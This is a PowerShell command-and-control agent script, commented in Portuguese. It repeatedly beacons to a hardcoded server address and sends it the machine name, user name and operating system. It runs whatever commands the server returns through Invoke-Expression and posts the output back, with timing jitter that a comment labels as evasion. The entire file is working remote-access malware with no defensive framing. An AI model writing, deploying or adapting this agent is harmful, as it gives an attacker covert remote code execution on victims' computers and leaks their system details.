# agent.ps1 - C2 Agent em PowerShell
param(
    [string]$C2Server = "http://192.168.0.10:8080/",
    [int]$BeaconInterval = 30
)

# Configurações
$AgentID = [System.Environment]::MachineName + "_" + (Get-Random -Maximum 9999)
$Jitter = 5

# Função para comunicação com C2
function Send-Beacon {
    param($Data)
    
    try {
        $body = @{
            id = $AgentID
            data = $Data
            host = $env:COMPUTERNAME
            user = $env:USERNAME
            os = (Get-WmiObject Win32_OperatingSystem).Caption
        } | ConvertTo-Json
        
        # Forçar UTF-8 sem BOM
        $utf8Body = [System.Text.Encoding]::UTF8.GetBytes($body)
        
        # Criar requisição manualmente para controlar encoding
        $webRequest = [System.Net.WebRequest]::Create("$C2Server/beacon")
        $webRequest.Method = "POST"
        $webRequest.ContentType = "application/json; charset=utf-8"
        $webRequest.ContentLength = $utf8Body.Length
        
        $requestStream = $webRequest.GetRequestStream()
        $requestStream.Write($utf8Body, 0, $utf8Body.Length)
        $requestStream.Close()
        
        $response = $webRequest.GetResponse()
        $reader = New-Object System.IO.StreamReader($response.GetResponseStream(), [System.Text.Encoding]::UTF8)
        $responseText = $reader.ReadToEnd()
        $reader.Close()
        $response.Close()
        
        return $responseText | ConvertFrom-Json
    }
    catch {
        Write-Host "[!] Erro no beacon: $_" -ForegroundColor Red
        return $null
    }
}

# Função para executar comandos
function Execute-Command {
    param($Command)
    
    try {
        if ($Command -is [string]) {
            $result = Invoke-Expression $Command 2>&1 | Out-String
        }
        else {
            $result = "Invalid command format"
        }
        return $result
    }
    catch {
        return "Error: $_"
    }
}

# Loop principal do beacon
Write-Host "[+] Agent $AgentID iniciado" -ForegroundColor Green

while ($true) {
    Write-Host "[*] Enviando beacon para $C2Server" -ForegroundColor Yellow
    
    # Enviar heartbeat e receber comandos
    $response = Send-Beacon "heartbeat"
    
    if ($response -and $response.command) {
        Write-Host "[*] Comando recebido: $($response.command)" -ForegroundColor Cyan
        
        # Executar comando
        $result = Execute-Command $response.command
        
       # Enviar resultado
        try {
            $resultBody = @{
                id = $AgentID
                data = @{
                    result = $result
                    command_id = $response.id
                }
            } | ConvertTo-Json

            $utf8Body = [System.Text.Encoding]::UTF8.GetBytes($resultBody)
            $webRequest = [System.Net.WebRequest]::Create("$C2Server/result")
            $webRequest.Method = "POST"
            $webRequest.ContentType = "application/json; charset=utf-8"
            $webRequest.ContentLength = $utf8Body.Length
            $requestStream = $webRequest.GetRequestStream()
            $requestStream.Write($utf8Body, 0, $utf8Body.Length)
            $requestStream.Close()
            $response2 = $webRequest.GetResponse()
            $response2.Close()
            Write-Host "[+] Resultado enviado!" -ForegroundColor Green
        } catch {
            Write-Host "[!] Erro ao enviar resultado: $_" -ForegroundColor Red
        }
    }
    
    # Jitter para evasão
    $sleepTime = $BeaconInterval + (Get-Random -Minimum -$Jitter -Maximum $Jitter)
    Start-Sleep -Seconds $sleepTime
}

# Mantém o processo rodando
while ($true) { Start-Sleep -Seconds 3600 }


